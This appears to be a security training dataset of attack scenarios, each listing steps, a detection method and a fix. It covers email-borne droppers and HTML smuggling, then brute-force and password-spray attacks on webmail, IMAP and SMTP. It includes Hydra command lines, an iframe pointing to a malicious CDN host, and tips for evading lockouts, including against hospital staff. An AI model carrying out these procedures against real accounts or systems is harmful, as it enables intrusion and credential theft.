Scenario Description: JavaScript script delivered that not only downloads malware but also modifies registry to persist after reboot.
Attack Steps: Step 1: Create JS file with certutil download logic.Step 2: Add command to insert value in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.Step 3: Email file as “Project_Proposal.js”.Step 4: Victim opens file and malware is downloaded.Step 5: Malware installs and registers itself for startup.Step 6: On reboot, malware restarts automatically.Step 7: Attacker maintains access.
Detection Method: Registry changes logs, EDR startup script alerts
Solution: Disable Run key, restrict scripts

Title: VBS File Camouflaged as TXT
Scenario Description: A file named “ShippingInfo.txt.vbs” is sent via email, pretending to be a text document. Users with hidden extensions enabled are tricked.
Attack Steps: Step 1: VBS script is written to launch payload silently.Step 2: File renamed to “ShippingInfo.txt.vbs”.Step 3: On systems with hidden extensions, it appears as “ShippingInfo.txt”.Step 4: Email crafted as shipping update from courier service.Step 5: Victim opens the file, expecting text.Step 6: Script executes and downloads malware.Step 7: Malware runs in background.
Detection Method: File extension logging, user behavior monitoring
Solution: Show full extensions, block VBS

Title: HTA Dropper from Email Calendar Invite
Scenario Description: HTA payload embedded in an ICS calendar invite attachment. When opened in Outlook, victim downloads and runs HTA file via calendar link.
Attack Steps: Step 1: Create an HTA file containing malicious PowerShell script.Step 2: Host the HTA on a server or cloud location.Step 3: Create ICS (calendar) file with link to HTA in event description.Step 4: Email user with subject like “Meeting Agenda Attached”.Step 5: Victim opens calendar invite and clicks the link.Step 6: HTA file is downloaded and opened.Step 7: Script runs silently in background and gives attacker remote access.
Detection Method: Proxy logs, EDR detection on mshta.exe
Solution: Sanitize ICS, block mshta.exe

Title: Fake Document Viewer in VBS
Scenario Description: Attacker sends a "Secure Document Viewer.vbs" file that runs malware disguised as viewer software.
Attack Steps: Step 1: Write VBS script that installs malware and shows a fake error message.Step 2: Save file as "SecureDocumentViewer.vbs".Step 3: Compose email pretending to be from a bank or lawyer sharing confidential files.Step 4: Victim opens the VBS thinking it's a viewer.Step 5: Malware installs in background.Step 6: VBS displays fake “Unsupported Format” pop-up to confuse the user.Step 7: Attacker receives C2 beacon from infected host.
Vulnerability: Trust in tools, VBS allowed by OS
Detection Method: WSH telemetry, AV behavior-based rules
Solution: Block VBS, monitor execution of WScript

Title: Malicious JS in Shared Google Drive Notification
Scenario Description: Attacker shares a Google Drive-hosted JS file and sends Google’s share notification email, abusing trusted domain.
Attack Steps: Step 1: Upload JS file to Google Drive and mark it public.Step 2: Use Google’s share interface to send automated share notification to victim.Step 3: Email comes from drive-shares-noreply@google.com (trusted).Step 4: Victim clicks the file and downloads it.Step 5: JS runs PowerShell or certutil to download malware.Step 6: Victim unknowingly installs a backdoor.Step 7: Attacker connects and maintains persistence.
Detection Method: DNS/proxy logs, endpoint behavior
Solution: Cloud link filtering, user awareness
Tags: JS, Google Drive Abuse, Social Trust

Title: HTA Loader as Email HTML Attachment
Scenario Description: Attacker embeds VBScript inside an HTML email attachment that extracts and launches HTA on click.
Attack Steps: Step 1: Craft an HTML file that has embedded VBScript.Step 2: Script writes and saves HTA to temp directory and launches it.Step 3: Send HTML file as “Secure Document.html”.Step 4: Email pretends to be secure file requiring HTML viewer.Step 5: Victim opens the file and allows content.Step 6: Script silently creates and executes HTA.Step 7: HTA runs PowerShell to download malware.
Vulnerability: HTML rendering, script execution in browser/email
Impact: Exploits local trust in HTML files
Detection Method: HTML inspection, HTA execution monitoring
Solution: Disable scriptable objects in email clients

Title: JS Script Triggering Word Macros
Attack Type: JS Activating MS Word via Shell
Scenario Description: A JavaScript file executes and uses Shell object to open a malicious Word file which has auto-macros.
Attack Steps: Step 1: Prepare malicious Word doc with auto-run macro.Step 2: Upload it to a remote location.Step 3: JS script written to download and open Word file using Shell.Run().Step 4: Email JS file as “SalaryUpdate.js”.Step 5: Victim opens JS file.Step 6: Script opens Word, which runs macro payload.Step 7: Macro connects back to attacker’s C2.
Vulnerability: Word macros enabled, script access to shell
Detection Method: App behavior logging, macro triggers
Solution: Disable macros + script blocking

Title: HTML Smuggling via Encrypted JavaScript Blob
Scenario Description: Attacker sends a seemingly safe email with an HTML attachment that constructs a malware file using JavaScript Blob inside the browser, bypassing traditional email security scanners.
Attack Steps: Step 1: Attacker creates an HTML file named invoice.html that uses JavaScript to assemble a malicious .exe file in the browser using Blob.Step 2: The script hides the payload in Base64-encoded chunks that are concatenated at runtime.Step 3: Attacker sends an email with a subject like “Pending Invoice” and attaches the HTML file.Step 4: User opens the attachment using Chrome or Edge, which triggers the script.Step 5: JavaScript reconstructs the malware file and triggers download (e.g., payload.exe).Step 6: User sees a file download prompt and, thinking it's safe, executes the file.Step 7: Malware installs a remote access trojan (RAT).
MITRE Technique: T1027.006 (Obfuscated Files or Information: HTML Smuggling)
Detection Method: Monitor HTML attachments with JavaScript blobs or download triggers
Solution: Disable script execution in HTML attachments; block .html attachments in emails

Title: HTML Smuggling with Fake Job Offer
Scenario Description: A job seeker receives an email from a fake recruiter with an HTML file attached that creates a backdoor dropper using JavaScript and saves it to the system silently.
Tools Used: Visual Studio Code, JavaScript, Windows Defender (disabled), Gmail
Attack Steps: Step 1: Attacker writes a job-themed email and embeds an offer.html file.Step 2: The HTML file contains obfuscated JavaScript that, when opened, constructs a .vbs dropper file.Step 3: User clicks and opens the attachment in Chrome.Step 4: JavaScript executes and saves a dropper.vbs file in %TEMP% folder.Step 5: Script silently executes using ActiveX objects, downloads second-stage payload (e.g., backdoor.exe) from attacker server.Step 6: Attacker gains persistent backdoor access to victim's machine.
Vulnerability: Obfuscated JavaScript Execution in Email Attachment
MITRE Technique: T1059.005 (Command and Scripting Interpreter: Visual Basic)
Detection Method: Endpoint monitoring, track VBScript creation events
Solution: Disable HTML attachments; train users not to open unsolicited recruiter attachments

Title: Smuggling Payloads Using HTML Form Auto-Submission
Scenario Description: A malicious HTML file auto-submits a hidden form containing a malicious script to the user's browser, creating a weaponized downloader disguised as a document.
Tools Used: HTML Editor, Burp Suite, Chrome DevTools
Attack Steps: Step 1: Attacker crafts an HTML file that auto-submits a hidden form with JavaScript that assembles a .bat file.Step 2: The .bat file includes PowerShell commands to download a ransomware payload.Step 3: Email with subject “Policy Update” is sent with policy.html attached.Step 4: User opens the HTML file.Step 5: Script triggers auto-submission, browser constructs the .bat file, and initiates download.Step 6: User sees “update_script.bat”, clicks it out of curiosity.Step 7: Ransomware encrypts local files.
Vulnerability: No user confirmation for form execution in browser
Detection Method: Monitor .bat creation; browser sandboxing
Solution: Warn users about unexpected attachments; disable auto form processing

Title: HTML Smuggling via Download Link Generator
Scenario Description: The attacker sends an HTML file that generates a fake download button mimicking a secure document portal, but delivers malware disguised as PDF.
Tools Used: HTML Editor, Base64 Encoder, PDF Icon Generator
Attack Steps: Step 1: Attacker encodes a malicious .exe using Base64 and embeds it into HTML with a fake "Download PDF" button.Step 2: File name is SecureDoc.html, attached to an official-looking email.Step 3: Victim opens the file in Chrome.Step 4: Button triggers download of Invoice2025.pdf.exe with double extension.Step 5: User, misled by the icon and name, executes the file.Step 6: Malware installs keylogger to capture credentials.Step 7: Attacker exfiltrates data via encrypted C2 channel.
Vulnerability: Trust in filename extension and icon
Detection Method: Monitor downloads with double extensions
Solution: Block .html and .exe in mail server filters; train users

Title: HTML Smuggling with Inline SVG + JavaScript
Scenario Description: Attacker hides JavaScript inside an inline SVG element in an HTML email attachment. The script reconstructs and drops a PowerShell script used to install spyware.
Attack Steps: Step 1: Attacker writes an HTML file with an embedded SVG image.Step 2: JavaScript is hidden in the <script> tag inside the SVG.Step 3: When user opens the HTML file, script executes, reconstructs a .ps1 script and saves it locally.Step 4: PowerShell script auto-executes using mshta.exe.Step 5: Script installs spyware that monitors browser activity and sends it to attacker's server.Step 6: The entire action occurs without visible signs to the user.
Detection Method: Monitor usage of mshta.exe and inline scripts
Solution: Strip out SVG/script combo from HTML files in email

Title: HTML Smuggling Using ZIP Loader and JavaScript Blob
Scenario Description: Attacker embeds JavaScript in HTML that reconstructs a ZIP file containing malware. The ZIP is downloaded silently and extracted by the user, tricking them into running malware.
Tools Used: HTML Editor, JSZip Library, Email Client
Attack Steps: Step 1: Attacker creates a ZIP file containing a hidden .exe malware.Step 2: The ZIP is Base64 encoded and embedded in JavaScript using the Blob object.Step 3: HTML file (SecureQuote.html) contains JS that reconstructs and triggers the ZIP download.Step 4: Email is crafted to look like a quote request, with attachment.Step 5: User opens the HTML file; browser initiates automatic ZIP download.Step 6: User extracts the ZIP and sees a file like Invoice2025.pdf.exe (fake icon).Step 7: On running it, system is compromised.
Detection Method: Monitor unexpected ZIP downloads from HTML
Solution: Block encoded ZIP blobs in attachments

Title: HTML Smuggling with Data URI Payload
Scenario Description: Payload is embedded directly in a data URI inside HTML, which runs immediately when opened.
Attack Steps: Step 1: Attacker creates a malicious .bat file containing PowerShell to fetch malware.Step 2: Encodes the entire script in Base64 and places it inside a data URI in HTML (data:text/html;base64,...).Step 3: Sends HTML as “HR Schedule Form.”Step 4: Victim opens the file.Step 5: JavaScript reads the data URI, creates a file using Blob, and triggers download.Step 6: File appears as “Schedule.bat”. Victim runs it, launching malware download.Step 7: Malware executes silently.
MITRE Technique: T1059.003 (Command and Scripting: Windows Command Shell)
Detection Method: Inspect attachment for data URI + JavaScript
Solution: Sanitize Data URI use in emails

Title: HTML Smuggling in Password Reset Request Scam
Scenario Description: Email claims to be from IT requesting a password reset confirmation, with an attached HTML file containing a phishing payload that mimics SSO login.
Attack Steps: Step 1: Attacker designs HTML to mimic company’s real login portal.Step 2: Email says “Your password reset was requested, open attached file to cancel.”Step 3: Victim opens the file, which loads local-looking login page.Step 4: When credentials are entered, they are sent to attacker’s server via AJAX.Step 5: Fake page says “Password Reset Cancelled” to appear legitimate.Step 6: Attacker captures login and reuses it immediately.
Vulnerability: Local file executed in browser looks trusted
Detection Method: Detect login forms in HTML attachments
Solution: Strip login forms from inbound HTML files

Title: HTML Smuggling with QR Code Bait
Scenario Description: HTML file renders a QR code which, when scanned, links to a malware-hosting site generated dynamically by JavaScript.
Attack Steps: Step 1: Attacker creates a dynamic QR code using JavaScript inside HTML.Step 2: The code points to a malicious EXE or APK download.Step 3: Email says “Scan QR to download security update.”Step 4: Victim scans QR from phone, opens shortened malicious URL.Step 5: Malware is downloaded directly on mobile/desktop device.Step 6: Victim installs what appears to be a legitimate update.Step 7: Attacker gains access to device or steals credentials.
Detection Method: Monitor email attachments generating QR
Solution: Disable active script + prevent QR abuse

Title: HTML Smuggling via Resume Submission Email
Scenario Description: Fake applicant sends a resume email with an HTML attachment that drops an obfuscated .exe file.
Attack Steps: Step 1: Attacker crafts email as fake job applicant, with Resume.html attached.Step 2: HTML contains JavaScript that extracts a hidden .exe from embedded strings.Step 3: Victim (HR or hiring manager) opens file.Step 4: Script reconstructs malware file and initiates download.Step 5: File appears as Resume_John.pdf.exe with a PDF icon.Step 6: Victim runs it, granting attacker access.Step 7: Attacker uses RAT for lateral movement.
Detection Method: Scan attachments for dual extensions
Solution: Enforce naming conventions & filters

Title: HTML Smuggling with JavaScript Obfuscation Chain
Scenario Description: Attacker obfuscates JavaScript in layers so that security tools can’t detect payload. The file rebuilds a .js dropper.
Attack Steps: Step 1: Attacker writes a JavaScript dropper to download spyware.Step 2: Code is obfuscated using multiple tools (Base64, JSFuck, unicode escapes).Step 3: HTML file (Memo.html) contains a trigger that reconstructs .js payload.Step 4: Victim opens HTML; script executes and reconstructs install.js.Step 5: File is saved to disk and silently executed via WScript.Step 6: Spyware runs in background, collecting sensitive info.Step 7: Data is exfiltrated via hidden browser tabs.
Detection Method: Detect use of eval, atob, long unicode
Solution: Block eval & suspicious JS patterns

Title: HTML Smuggling via Embedded iframe to Malicious CDN
Scenario Description: HTML contains an iframe that silently pulls malicious script from CDN and runs it in user's browser.
Tools Used: HTML, Fake CDN URL, Email Client
Attack Steps: Step 1: HTML attachment contains <iframe src="https://malicious-cdn.xyz/script.js">.Step 2: When opened, iframe runs a loader script that builds an EXE in memory.Step 3: Script creates a downloadable malware file (update_tool.exe).Step 4: Victim sees a fake “Download Update” message.Step 5: Upon clicking, malware is downloaded and run.Step 6: Attacker gets access to system and internal files.Step 7: Malware remains persistent on reboot.
Detection Method: Detect suspicious CDN calls in iframe
Solution: Block iframe src in HTML email

Title: HTML Smuggling via Auto-generated Excel Sheet
Scenario Description: The HTML simulates an Excel document interface in browser with fake macros that download malware.
Attack Steps: Step 1: HTML mimics Excel UI with buttons like “Enable Macros.”Step 2: Button click initiates JavaScript that builds and downloads malware.exe.Step 3: Email pretends to be an “Annual Budget Review.”Step 4: Victim opens HTML file and sees simulated Excel interface.Step 5: Clicking “Enable Macros” actually downloads payload.Step 6: Victim runs file believing it's a required macro tool.Step 7: Malware installs remote keylogger.
Detection Method: Monitor HTML UIs with click actions
Solution: User education; block pseudo-Excel HTML

Title: HTML Smuggling via External Script Injection
Scenario Description: The HTML file loads an external JavaScript payload dynamically via DOM manipulation and writes a dropper file.
Attack Steps: Step 1: HTML attachment contains minimal code that builds <script src> dynamically.Step 2: Script loads remote dropper.js file from attacker's server.Step 3: dropper.js reconstructs a .vbs file and downloads malware.Step 4: Email sent as “Compliance Policy Update.”Step 5: Victim opens file, script downloads and runs dropper.Step 6: Malware infects system and hides in AppData folder.Step 7: Attacker maintains stealth access.
Vulnerability: Trust in benign-looking HTML + remote code
Detection Method: Monitor remote script inclusion
Solution: Block dynamic <script> in HTML files

Title: HTML Smuggling via SVG-Encoded PowerShell Script
Scenario Description: A PowerShell command is hidden inside SVG, loaded via HTML attachment and silently executed.
Attack Steps: Step 1: Attacker encodes PowerShell script inside SVG <desc> tag.Step 2: HTML uses JS to extract the description and save it as .ps1.Step 3: File appears as chart.html sent in email pretending to be a report.Step 4: Victim opens file, script saves install.ps1 to disk.Step 5: Execution triggered using mshta.exe silently.Step 6: Script runs spyware and opens hidden browser windows.Step 7: Attacker monitors victim activity remotely.
Vulnerability: SVG tag content overlooked by scanners
Detection Method: Scan SVG for non-visual tags
Solution: Block SVG parsing inside HTML

Title: HTML Smuggling with PDF-like Interface (Polyglot HTML)
Scenario Description: A highly convincing HTML attachment mimics a PDF viewer and tricks the user into clicking a fake "Print" button that downloads malware.
Tools Used: HTML/CSS, JavaScript, Fake PDF Icon, Browser
Attack Steps: Step 1: Attacker designs an HTML file with a fake embedded PDF viewer interface using HTML and CSS (fonts, borders, icons).Step 2: The file has a button labeled “Print this Document” or “Download Full PDF.”Step 3: When user clicks the button, JavaScript constructs a hidden .exe using a Blob and triggers its download.Step 4: The email subject is “Your Tax Document 2025” with TaxStatement.html attached.Step 5: User opens file in Chrome or Edge.Step 6: Browser displays PDF-like interface with print icon; user clicks it.Step 7: Malware named Tax_2025_Statement.pdf.exe is downloaded.Step 8: Victim runs file, thinking it is a legitimate tax PDF, but it installs spyware.
Detection Method: Look for fake PDF UIs in HTML
Solution: Strip or quarantine fake UI mimicry in mail filters

Title: HTML Smuggling via Browser Cache Abuse
Scenario Description: Attacker uses HTML with JavaScript that loads malware in pieces from browser cache after receiving an email, bypassing file scanners.
Attack Steps: Step 1: Attacker hosts malware chunks on a CDN and ensures they're cached by browser (via embedded ads or preloads).Step 2: HTML attachment named Agreement.html contains JS to stitch cached content into a full file.Step 3: User receives a legitimate-looking email: “Please review this contract.”Step 4: Victim opens the HTML file; JavaScript reconstructs .exe using cached assets.Step 5: File is downloaded silently with the name Contract2025.exe.Step 6: Victim executes file, unaware that the file was not part of the email.Step 7: Malware installs silently, bypassing email scanning.
Vulnerability: File scanner cannot scan browser cache
Detection Method: Inspect cache access via HTML attachments
Solution: Clear cache on session end; block cache-assembling scripts

Title: HTML Smuggling via Clipboard Injection
Scenario Description: Attacker uses JavaScript in HTML to silently copy a PowerShell malware command to the user's clipboard when the file is opened.
Attack Steps: Step 1: Attacker writes a PowerShell one-liner that downloads and executes spyware.Step 2: Encodes the command and places it in a clipboard copy operation in JavaScript.Step 3: HTML file (IT_Form.html) says “Paste this into PowerShell to verify system info.”Step 4: When opened, the clipboard is auto-filled with the malicious command.Step 5: Victim, misled by text, pastes the content into PowerShell terminal.Step 6: Command runs, downloads and installs spyware silently.Step 7: Attacker gains full access to system.
Vulnerability: Clipboard abuse in browser not monitored
Detection Method: Monitor clipboard events on file open
Solution: Disable clipboard access for untrusted HTML

Title: HTML Smuggling via Email Auto-Forward Rule
Scenario Description: Attack includes HTML that configures a hidden email auto-forward rule via Outlook scripting, leaking future emails to attacker.
Attack Steps: Step 1: HTML file contains hidden PowerShell payload embedded using Base64.Step 2: JavaScript writes and drops a .ps1 script when user opens the file.Step 3: Victim sees a fake “Secure Attachment” message and clicks to unlock.Step 4: Unlock triggers the dropped PowerShell script using mshta.exe.Step 5: Script configures Outlook to auto-forward all incoming mails to attacker email.Step 6: No visible indication to user; data exfiltration begins.Step 7: Attacker monitors inbox contents, including credentials and sensitive info.
Vulnerability: No prompts for new email rule creation
Detection Method: Monitor changes to Outlook rules
Solution: Block Outlook rule creation from scripts

Title: HTML Smuggling Using Fake System Update Notice
Scenario Description: HTML displays a fake OS update screen inside the browser with progress bar. After a delay, it downloads malware disguised as update installer.
Attack Steps: Step 1: Attacker creates a full-screen HTML fake update screen using CSS animations and text.Step 2: Includes a “Download Patch” button shown after countdown.Step 3: File (Security_Update.html) is sent in email saying: “Immediate Patch Required!”Step 4: User opens file, sees browser go full screen with Microsoft/OS logo and spinning loader.Step 5: After 30s, a button appears labeled “Click to Install Update.”Step 6: Button triggers download of PatchUpdate.exe containing backdoor.Step 7: Victim installs thinking it’s legitimate; attacker gains shell access.
Vulnerability: Visual mimicry of OS update screens
Detection Method: Block full-screen HTML attachments
Solution: Educate users on real update processes

Title: OWA Login Brute Force on Corporate Email
Scenario Description: Attacker targets a corporate Outlook Web App (OWA) portal using Hydra to brute-force employee credentials.
Attack Steps: Step 1: Identify the login portal URL (e.g., https://mail.company.com/owa)Step 2: Use Firefox to capture login request using Burp Suite proxy.Step 3: Analyze POST request parameters for username and password fields.Step 4: Prepare a list of email addresses (usernames) from LinkedIn or company leaks.Step 5: Prepare a password list with commonly used corporate passwords.Step 6: Use Hydra to perform brute-force attack on the OWA URL.Step 7: Monitor Hydra output for successful login credentials.Step 8: Use valid credentials to log into the email interface.
Vulnerability: Weak Password Policy, No Rate Limiting
Detection Method: Monitor login attempts per IP, look for many failed logins
Solution: Enforce lockout after 5 failed logins, MFA, IP whitelisting
Tags: brute force, email hacking, OWA, hydra

Title: Gmail Account Takeover via Password Spray
Scenario Description: Attacker performs a password spray attack on personal Gmail accounts using a large email list and common passwords.
Tools Used: Gmail, Python, SmtpLib, Custom Spray Script
Attack Steps: Step 1: Collect a list of Gmail addresses (from old leaks or social media scraping).Step 2: Select a list of 10 common passwords like “123456”, “password123”.Step 3: Write or download a script that uses SMTP/IMAP to test logins (avoid lockouts).Step 4: Attempt login using each password across all usernames (not one-by-one to avoid detection).Step 5: Log successful login attempts.Step 6: Attempt to access the account via web login using the stolen credentials.Step 7: Exfiltrate account data or reset linked accounts.
Detection Method: Gmail alerts unusual sign-in activity; impossible travel alert
Solution: Strong password policy, MFA enabled
Tags: spray attack, gmail, smtp abuse, brute force

Title: Microsoft 365 Account Attack via Azure AD Endpoint
Scenario Description: Brute-force attack on Microsoft 365 user accounts via Azure login endpoints using scripting tools.
Attack Steps: Step 1: Obtain a list of company email addresses.Step 2: Download MSOLSpray tool (PowerShell script).Step 3: Choose a password list (e.g., Winter2025!, Company@123).Step 4: Execute MSOLSpray to test each email against each password.Step 5: Detect successful credentials in the output.Step 6: Attempt login to https://outlook.office365.com to verify access.Step 7: Optionally try to bypass MFA using legacy authentication protocols (e.g., IMAP).
Impact: Unauthorized access to enterprise email & SharePoint
Detection Method: Excessive failed logins in Azure logs
Solution: Disable legacy auth, conditional access policy, enforce MFA

Title: IMAP Brute Force via Hydra Against cPanel Mail
Scenario Description: Brute-force attack targets a hosting provider's mail server using IMAP protocol on port 993.
Attack Steps: Step 1: Use nmap to scan mail.domain.com and confirm IMAP service on port 993.Step 2: Use Wireshark or Telnet to verify IMAP response.Step 3: Prepare username and password list.Step 4: Run Hydra command: hydra -L users.txt -P pass.txt imap.domain.com imap.Step 5: Wait for Hydra to return valid credentials.Step 6: Login to webmail or Thunderbird to verify account access.Step 7: Optional: Setup email forwarding rule for persistence.
Vulnerability: IMAP access open, weak auth controls
Impact: Full access to mail account, data leak
Detection Method: Anomalous IMAP login patterns
Solution: Disable IMAP or rate-limit logins
Tags: imap brute force, hydra, hosting email

Title: SMTP Auth Brute Force to Hijack Email Sending
Scenario Description: Attacker brute-forces SMTP AUTH to send phishing/spam from compromised accounts.
Attack Steps: Step 1: Use nmap to find SMTP port (usually 587 or 465).Step 2: Use Telnet to test manual login with known username and dummy password.Step 3: Identify proper AUTH method (e.g., LOGIN or PLAIN).Step 4: Use Medusa with user/pass list to perform brute force.Step 5: Successful logins allow sending mail as the user.Step 6: Compose a phishing mail and send via SMTP using stolen credentials.Step 7: Monitor whether mails land in inbox or spam.
Vulnerability: SMTP auth with weak creds, open relay
Impact: Hijack of email account, spam/phishing sent
Detection Method: Monitor SMTP logs and spam complaints
Solution: Use DKIM/DMARC/SPF, enforce strong auth
Tags: smtp attack, password brute force, spam abuse

Title: Password Spray Attack on Roundcube Webmail
Scenario Description: Attacker targets Roundcube email portal used by a university by spraying common passwords across many known usernames.
Attack Steps: Step 1: Visit target Roundcube login page (e.g., mail.university.edu).Step 2: Use Firefox with Burp Suite proxy to intercept the login request.Step 3: Save request format (POST variables) for automation.Step 4: Generate a list of known student usernames (e.g., 2023_john, 2023_ravi).Step 5: Use a small password list like “Welcome@123”, “Student@2024”.Step 6: Launch Hydra against the portal using the collected data.Step 7: Identify valid credentials and attempt direct login.Step 8: Access inbox, calendar, or other Roundcube features.
Impact: Unauthorized access to student or staff emails
Detection Method: Excessive login failures from a single IP
Solution: MFA + lockout policies + CAPTCHA

Title: VoIP Email Portal Spray Attack
Scenario Description: A VoIP service uses email-based login for voicemail, which is targeted using password spray to access recordings.
Attack Steps: Step 1: Access VoIP voicemail login page.Step 2: Intercept the login POST request using Burp.Step 3: Save the request pattern (email+password fields).Step 4: Prepare a target list of company email accounts.Step 5: Use Hydra with limited passwords: “Voicemail2024”, “Welcome@123”.Step 6: Run Hydra with slow timings to avoid detection.Step 7: Login to voicemail using valid credentials.Step 8: Download or forward audio messages to attacker email.
Detection Method: Logins from new IPs, access to voicemail logs
Solution: Complex password rules + monitoring

Title: Zimbra Webmail Brute Force
Scenario Description: Zimbra mail server login targeted using brute-force attack via dictionary-based tool.
Attack Steps: Step 1: Identify login page (e.g., https://zmail.company.com).Step 2: Use DirBuster to fingerprint potential paths (admin, login.jsp).Step 3: Intercept a real login request with ZAP proxy.Step 4: Prepare dictionary files of usernames/passwords.Step 5: Use Hydra with “http-post-form” to simulate login.Step 6: Slowly test combinations; stop on success.Step 7: Login and exfiltrate emails via web portal.Step 8: Optionally create email forwarding rules.
Detection Method: Too many POST failures from a client
Solution: Lockout per user + proxy detection

Title: Office365 Legacy IMAP Spray Attack
Scenario Description: Attacker bypasses modern MFA by spraying legacy IMAP login across Office365 accounts.
Attack Steps: Step 1: Extract email list from public breach.Step 2: Identify organization uses Office365 (verify using MX records).Step 3: Check if IMAP legacy auth is enabled via telnet on port 993.Step 4: Prepare password spray list.Step 5: Use Python script to test email/password via IMAP.Step 6: Log successful logins.Step 7: Download inbox messages using IMAP client.Step 8: Search inbox for sensitive content or passwords.
Detection Method: Logs show legacy protocol use
Solution: Disable IMAP, enforce modern auth only

Title: Shared Mailbox Brute Force in Enterprise
Scenario Description: Attacker brute-forces credentials of a shared mailbox account used for HR queries (e.g., hr@company.com).
Attack Steps: Step 1: Identify target shared email account (e.g., from website contact page).Step 2: Use IMAP brute-force tool with 10,000 password list.Step 3: Slowly test passwords via IMAP to avoid detection.Step 4: Once login is successful, access mailbox via Outlook or Thunderbird.Step 5: Exfiltrate job candidate data, resumes, HR documents.Step 6: Set inbox forwarding rule to external email for persistence.
Vulnerability: No lockout policy for shared inbox
Detection Method: Detect multiple failures to shared accounts
Solution: Separate auth for shared boxes + strong policy
Tags: hr mailbox, shared login, brute force

Title: Apple Mail (iCloud) Brute Force via IMAP
Scenario Description: Attacker targets iCloud mail using automated IMAP login attempts.
Attack Steps: Step 1: Gather list of iCloud email accounts.Step 2: Verify login port via telnet to imap.mail.me.com 993.Step 3: Use Hydra with a password list on IMAP service.Step 4: Pause periodically to avoid Apple’s rate limits.Step 5: On success, login to iCloud and exfiltrate messages.Step 6: Search inbox for iTunes receipts or bank info.Step 7: Download attachments via IMAP.
Detection Method: Apple alerts suspicious logins
Solution: Strong password + iCloud MFA

Title: SMTP AUTH Brute Force for Sending Internal Spam
Scenario Description: Attack brute-forces SMTP auth on port 587 to send phishing from internal IP.
Attack Steps: Step 1: Identify SMTP login endpoint on mail.company.com.Step 2: Test basic auth with Telnet or SMTPTester.Step 3: Use brute-force tool with valid usernames and guessable passwords.Step 4: Verify success by sending mail to attacker-controlled inbox.Step 5: Launch mass spam campaign impersonating CEO.Step 6: Monitor inbox replies for sensitive content.
Impact: Spam from inside domain, brand damage
Detection Method: SPF/DKIM failure alerts, bounce logs
Solution: Rate limit SMTP logins, enforce 2FA

Title: Brute Forcing Email via Mobile App API
Scenario Description: Mobile email client API endpoint targeted with credential brute force.
Attack Steps: Step 1: Install the mobile app on emulator.Step 2: Capture API traffic (login POST request) using Burp.Step 3: Replicate the request in Postman or Python requests module.Step 4: Prepare username/password combo list.Step 5: Loop through requests with headers to mimic device.Step 6: On success, simulate access to mailbox.Step 7: Extract user inbox, contacts, attachments via API.
Detection Method: API abuse alerts, login anomalies
Solution: Rate-limiting + device fingerprinting

Title: Email Credential Stuffing from Breach Dump
Scenario Description: Attacker reuses email-password pairs from a public data breach on new email portals.
Attack Steps: Step 1: Download breach dump from dark web (email:passwords).Step 2: Configure OpenBullet with the target webmail login page.Step 3: Feed in combo list and configure success parameters.Step 4: Start the automated credential testing.Step 5: Log all successful hits.Step 6: Log into valid accounts and pivot to other services.
Detection Method: Impossible login location alert
Solution: Enforce unique passwords, MFA

Title: Office365 Brute Force via SMTP Auth from Botnet
Scenario Description: Distributed brute-force SMTP auth on O365 from hundreds of bot IPs to avoid detection.
Attack Steps: Step 1: Distribute script to 100 virtual bot agents with unique IPs.Step 2: Use bot nodes to send SMTP AUTH attempts in round-robin.Step 3: Monitor logs centrally for successful logins.Step 4: Upon success, escalate access via email client.Step 5: Use compromised account for phishing campaign internally.Step 6: Maintain access by setting app password or rules.
Vulnerability: No geo/IP detection, SMTP auth open
Impact: Widespread compromise, undetected by single-IP defense
Detection Method: Volume-based SMTP logs, UEBA alerts
Solution: Geo-fencing, SMTP auth throttling

Title: Brute-Force on Exim Mail Server via SMTP Login
Scenario Description: An attacker targets an Exim SMTP server (used on Linux servers) by brute-forcing login credentials to send emails as a legitimate user.
Attack Steps: Step 1: Scan the mail server using Nmap to identify if SMTP port (25, 587) is open.Step 2: Use Telnet to test SMTP banner and confirm Exim is running.Step 3: Open Wireshark to capture SMTP handshake and authentication mechanisms.Step 4: Prepare a list of known usernames and weak passwords.Step 5: Use Hydra to brute-force SMTP authentication: hydra -L users.txt -P passwords.txt mail.domain.com smtp.Step 6: Wait for a successful login indication from Hydra.Step 7: Use Metasploit SMTP module or Telnet to send a test email from the compromised account.Step 8: If successful, automate spam/phishing emails from compromised account.
Impact: Attacker gains ability to send spoofed internal emails
Detection Method: Log monitoring, spam filter alerts, volume anomalies
Solution: Limit external SMTP access, enforce strong passwords

Title: Brute Force on Yahoo Mail via POP3 Legacy Access
Scenario Description: Attacker targets legacy POP3 access on Yahoo Mail using credential guessing for unauthorized mailbox access.
Attack Steps: Step 1: Confirm POP3 access by connecting to pop.mail.yahoo.com on port 995 using Telnet or POP3Client.Step 2: Use Nmap to confirm service availability.Step 3: Prepare a list of leaked Yahoo emails and common passwords.Step 4: Use Hydra to attempt brute force: hydra -L users.txt -P passwords.txt pop.mail.yahoo.com pop3.Step 5: Log in with successful credentials to the POP3 client.Step 6: Download all inbox emails to a local machine.Step 7: Review emails for password resets, financial information, or verification codes.Step 8: If MFA is not enabled, pivot to full account control.
Vulnerability: POP3 legacy enabled, weak password reuse
Impact: Full inbox compromise without triggering MFA
Detection Method: Yahoo security alerts, access from new location/IP
Solution: Disable legacy POP3 access, enforce OAuth/MFA

Title: Webmail Brute Force on Horde Email Client
Scenario Description: Attacker targets Horde webmail login page by brute-forcing user credentials to access web interface and stored messages.
Attack Steps: Step 1: Access the Horde login portal (e.g., mail.hordehost.com).Step 2: Use Firefox with Burp Suite to capture the login request.Step 3: Identify username and password form fields in POST data.Step 4: Prepare email addresses based on username patterns (e.g., user1@domain.com).Step 5: Use common or default passwords like “Horde123”, “Email@2024”.Step 6: Configure Hydra to run a brute-force login against the captured POST request.Step 7: Wait for Hydra to reveal successful login.Step 8: Log into Horde and view inbox, sent messages, and other folders.Step 9: Optionally, exfiltrate stored attachments.
Detection Method: High login failures in access logs
Solution: CAPTCHA, login delay, MFA

Title: Targeted Password Spray on Medical Staff Email Portal
Scenario Description: Attacker targets hospital staff login portal using a limited number of passwords across many user accounts to avoid lockout.
Attack Steps: Step 1: Identify hospital’s webmail portal (e.g., mail.hospital.com).Step 2: Use Burp Suite to intercept the login request structure.Step 3: Harvest staff email addresses from hospital staff directory.Step 4: Prepare a short password list based on hospital naming patterns (e.g., "Hospital2024!", "Med@123").Step 5: Run a slow spray attack with delays to bypass lockout.Step 6: Once a credential is found, log into the mailbox via web interface.Step 7: Read internal patient communication and prescription data.Step 8: Optionally forward inbox emails to attacker’s email ID for persistence.
Impact: Access to sensitive health records, HIPAA violation
Detection Method: Excessive failed login attempts
Solution: MFA, IP-based lockout, breach monitoring

